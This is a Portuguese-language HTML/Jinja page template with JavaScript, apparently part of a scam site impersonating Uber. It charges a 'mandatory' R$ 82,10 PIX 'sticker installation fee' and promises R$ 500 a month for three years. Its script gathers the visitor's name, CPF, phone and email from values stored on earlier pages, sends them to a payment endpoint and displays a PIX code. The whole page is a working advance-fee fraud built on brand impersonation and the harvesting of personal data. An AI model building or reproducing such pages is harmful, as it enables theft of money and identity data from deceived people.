{% extends "layout.html" %}

{% block content %}
<div class="min-h-screen bg-gray-50 py-8 px-4">
    <div class="max-w-4xl mx-auto">
        <!-- Header Section -->
        <div class="text-center mb-8">
            <h1 class="text-3xl font-bold text-black mb-4">Taxa de Instalação do Adesivo Uber</h1>
            <p class="text-red-600 font-semibold text-lg">PAGAMENTO OBRIGATÓRIO</p>
        </div>

        <!-- Important Information -->
        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-6 mb-8">
            <div class="flex">
                <div class="ml-3">
                    <h3 class="text-lg font-medium text-yellow-800 mb-3">
                        ⚠️ Informações Importantes sobre a Instalação
                    </h3>
                    <div class="text-yellow-700 space-y-2">
                        <p>• <strong>O adesivo DEVE ser instalado por um funcionário autorizado da Uber</strong></p>
                        <p>• O funcionário irá instalar o adesivo e tirar foto como comprovação</p>
                        <p>• <strong>Sem o pagamento desta taxa, você NÃO participará do programa</strong></p>
                        <p>• <strong>Sem a instalação, você NÃO receberá os R$ 500,00 mensais por 3 anos</strong></p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Appointment Scheduling -->
        <div class="bg-white rounded-lg shadow-lg p-6 mb-8">
            <h2 class="text-xl font-semibold text-black mb-6">Agendar Instalação do Adesivo</h2>
            
            <!-- Calendar -->
            <div class="mb-6">
                <h3 class="text-lg font-medium text-gray-800 mb-3">Selecione o Dia:</h3>
                <div id="calendar" class="grid grid-cols-7 gap-2 text-center">
                    <!-- Calendar will be generated by JavaScript -->
                </div>
            </div>

            <!-- Time Selector -->
            <div class="mb-6">
                <h3 class="text-lg font-medium text-gray-800 mb-3">Selecione o Horário:</h3>
                <div class="grid grid-cols-3 gap-3">
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="07:00">07:00</button>
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="09:00">09:00</button>
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="11:00">11:00</button>
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="13:00">13:00</button>
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="15:00">15:00</button>
                    <button class="time-slot px-4 py-2 border border-gray-300 rounded-lg hover:bg-blue-50 hover:border-blue-300" data-time="17:00">17:00</button>
                </div>
            </div>

            <!-- Selected Appointment Display -->
            <div id="selectedAppointment" class="bg-green-50 border border-green-200 rounded-lg p-4 mb-6" style="display: none;">
                <h4 class="font-semibold text-green-800 mb-2">Agendamento Selecionado:</h4>
                <p class="text-green-700">
                    Data: <span id="selectedDate"></span><br>
                    Horário: <span id="selectedTime"></span>
                </p>
            </div>
        </div>

        <!-- Loading Message -->
        <div id="loadingMessage" class="text-center text-gray-600 mb-6">
            Carregando dados de pagamento...
        </div>

        <!-- PIX Payment Section -->
        <div class="bg-white rounded-lg shadow-lg p-6 mb-6">
            <div class="text-center mb-6">
                <h2 class="text-xl font-semibold text-black mb-2">PIX - R$ 82,10</h2>
                <p class="text-gray-600">Taxa de Instalação do Adesivo</p>
            </div>

            <!-- QR Code -->
            <div class="text-center mb-6">
                <img id="pixQrCode" src="" alt="QR Code PIX" class="mx-auto w-48 h-48 border rounded-lg" style="display: none;">
            </div>

            <!-- PIX Code Section -->
            <div id="pixCodeSection" class="mb-6" style="display: none;">
                <label class="block text-sm font-medium text-gray-700 mb-2">Código PIX (Copia e Cola)</label>
                <div class="flex gap-2">
                    <input type="text" id="pixCode" readonly class="flex-1 px-3 py-2 border border-gray-300 rounded-md text-sm font-mono bg-gray-50">
                    <button onclick="copyPixCode()" id="copyButton" class="px-4 py-2 bg-black text-white rounded-md hover:bg-gray-800 transition-colors">
                        Copiar
                    </button>
                </div>
            </div>

            <!-- Payment Instructions -->
            <div class="bg-gray-50 rounded-lg p-4">
                <h3 class="font-semibold text-black mb-2">Como pagar:</h3>
                <ol class="list-decimal list-inside text-sm text-gray-600 space-y-1">
                    <li>Selecione data e horário para instalação acima</li>
                    <li>Abra o app do seu banco</li>
                    <li>Escolha a opção PIX</li>
                    <li>Escaneie o QR Code ou cole o código</li>
                    <li>Confirme o pagamento de R$ 82,10</li>
                    <li>Aguarde nosso funcionário no dia e horário agendados</li>
                </ol>
            </div>
        </div>
    </div>
</div>

<script>
// Calendar and appointment scheduling
let selectedDate = null;
let selectedTime = null;

// Generate calendar for current month
function generateCalendar() {
    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth();
    const today = now.getDate();
    
    const firstDay = new Date(currentYear, currentMonth, 1);
    const lastDay = new Date(currentYear, currentMonth + 1, 0);
    const daysInMonth = lastDay.getDate();
    const startDay = firstDay.getDay(); // 0 = Sunday
    
    const monthNames = ['Janeiro', 'Fevereiro', 'Março', 'Abril', 'Maio', 'Junho',
                       'Julho', 'Agosto', 'Setembro', 'Outubro', 'Novembro', 'Dezembro'];
    const dayNames = ['Dom', 'Seg', 'Ter', 'Qua', 'Qui', 'Sex', 'Sáb'];
    
    const calendar = document.getElementById('calendar');
    calendar.innerHTML = '';
    
    // Month/Year header
    const header = document.createElement('div');
    header.className = 'col-span-7 text-lg font-semibold text-center mb-4 text-black';
    header.textContent = `${monthNames[currentMonth]} ${currentYear}`;
    calendar.appendChild(header);
    
    // Day names header
    dayNames.forEach(day => {
        const dayHeader = document.createElement('div');
        dayHeader.className = 'text-sm font-medium text-gray-600 py-2';
        dayHeader.textContent = day;
        calendar.appendChild(dayHeader);
    });
    
    // Empty cells for days before month starts
    for (let i = 0; i < startDay; i++) {
        const emptyDay = document.createElement('div');
        calendar.appendChild(emptyDay);
    }
    
    // Days of the month
    for (let day = 1; day <= daysInMonth; day++) {
        const dayElement = document.createElement('button');
        dayElement.textContent = day;
        dayElement.className = 'w-10 h-10 rounded-lg border border-gray-300 text-sm';
        
        // Disable past days and next 3 days
        if (day < today || day <= today + 3) {
            dayElement.className += ' bg-gray-100 text-gray-400 cursor-not-allowed';
            dayElement.disabled = true;
        } else {
            dayElement.className += ' bg-white hover:bg-blue-50 hover:border-blue-300 cursor-pointer';
            dayElement.onclick = () => selectDate(day, currentMonth, currentYear);
        }
        
        calendar.appendChild(dayElement);
    }
}

// Select date function
function selectDate(day, month, year) {
    selectedDate = `${day}/${month + 1}/${year}`;
    
    // Update visual selection
    document.querySelectorAll('#calendar button:not([disabled])').forEach(btn => {
        btn.classList.remove('bg-blue-500', 'text-white');
        btn.classList.add('bg-white');
    });
    
    event.target.classList.remove('bg-white');
    event.target.classList.add('bg-blue-500', 'text-white');
    
    updateSelectedAppointment();
}

// Select time function
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('.time-slot').forEach(button => {
        button.onclick = function() {
            selectedTime = this.dataset.time;
            
            // Update visual selection
            document.querySelectorAll('.time-slot').forEach(btn => {
                btn.classList.remove('bg-blue-500', 'text-white');
                btn.classList.add('bg-white');
            });
            
            this.classList.remove('bg-white');
            this.classList.add('bg-blue-500', 'text-white');
            
            updateSelectedAppointment();
        };
    });
});

// Update selected appointment display
function updateSelectedAppointment() {
    if (selectedDate && selectedTime) {
        document.getElementById('selectedDate').textContent = selectedDate;
        document.getElementById('selectedTime').textContent = selectedTime;
        document.getElementById('selectedAppointment').style.display = 'block';
        
        // Store appointment in localStorage
        localStorage.setItem('selectedAppointment', JSON.stringify({
            date: selectedDate,
            time: selectedTime
        }));
    }
}

// Auto-generate PIX payment on page load
document.addEventListener('DOMContentLoaded', async function() {
    // Generate calendar
    generateCalendar();
    
    try {
        // Get user data from localStorage - check all possible sources
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        const paymentData = JSON.parse(localStorage.getItem('cnvPaymentData') || '{}');
        
        // Try multiple localStorage keys for user data
        const userName = (
            paymentData.name || 
            userData.full_name || 
            userData.name || 
            localStorage.getItem('candidateName') || 
            localStorage.getItem('userName') || 
            ''
        );
        
        const userCPF = (
            paymentData.cpf || 
            userData.cpf || 
            localStorage.getItem('candidateCPF') || 
            localStorage.getItem('userCPF') || 
            ''
        );
        
        const userPhone = (
            paymentData.phone || 
            userData.phone || 
            localStorage.getItem('candidatePhone') || 
            localStorage.getItem('userPhone') || 
            ''
        );
        
        const userEmail = (
            paymentData.email || 
            userData.email || 
            localStorage.getItem('candidateEmail') || 
            localStorage.getItem('userEmail') || 
            ''
        );
        
        console.log('Extracted user data:', { name: userName, cpf: userCPF, phone: userPhone, email: userEmail });
        
        if (userName && userCPF) {
            const payloadData = {
                name: userName,
                cpf: userCPF,
                email: userEmail,
                phone: userPhone
            };
            
            console.log('Sending payload:', payloadData);
            
            // Create payment using existing endpoint
            const response = await fetch('/create_cnv_payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payloadData)
            });
            
            const result = await response.json();
            console.log('API Response:', result);
            
            if (result.success && result.payment_data) {
                const pixData = result.payment_data;
                console.log('PIX Data:', pixData);
                
                // Display real PIX code
                if (pixData.pixCopyPaste) {
                    document.getElementById('pixCode').value = pixData.pixCopyPaste;
                    document.getElementById('pixCodeSection').style.display = 'block';
                    console.log('PIX code set successfully');
                }
                
                // Display real QR Code
                if (pixData.pixQrCode) {
                    const qrCodeElement = document.getElementById('pixQrCode');
                    qrCodeElement.src = pixData.pixQrCode;
                    qrCodeElement.style.display = 'block';
                    console.log('QR Code displayed successfully');
                }
                
                // Store payment ID for status checking
                if (pixData.paymentId) {
                    localStorage.setItem('cnvPaymentId', pixData.paymentId);
                    console.log('Payment ID stored:', pixData.paymentId);
                }
                
                // Hide loading message
                document.getElementById('loadingMessage').style.display = 'none';
                
            } else {
                throw new Error(result.error || 'Erro ao criar pagamento PIX');
            }
        } else {
            console.error('Dados do usuário incompletos:', { name: userName, cpf: userCPF, phone: userPhone });
            document.getElementById('loadingMessage').innerHTML = `
                <div class="text-red-600">
                    Dados do usuário não encontrados no localStorage.<br>
                    Nome: ${userName || 'não encontrado'}<br>
                    CPF: ${userCPF || 'não encontrado'}<br>
                    <a href="/" class="text-blue-600 underline">Voltar ao início</a>
                </div>
            `;
        }
    } catch (error) {
        console.error('Erro ao criar pagamento:', error);
        document.getElementById('loadingMessage').innerHTML = `
            <div class="text-red-600">
                Erro ao carregar dados de pagamento: ${error.message}<br>
                <a href="/" class="text-blue-600 underline">Voltar ao início</a>
            </div>
        `;
    }
});

// Copy PIX code function
function copyPixCode() {
    const pixCodeElement = document.getElementById('pixCode');
    pixCodeElement.select();
    pixCodeElement.setSelectionRange(0, 99999);
    document.execCommand('copy');
    
    const copyButton = document.getElementById('copyButton');
    copyButton.textContent = 'Copiado!';
    copyButton.classList.remove('bg-black', 'hover:bg-gray-800');
    copyButton.classList.add('bg-green-600');
}
</script>

{% endblock %}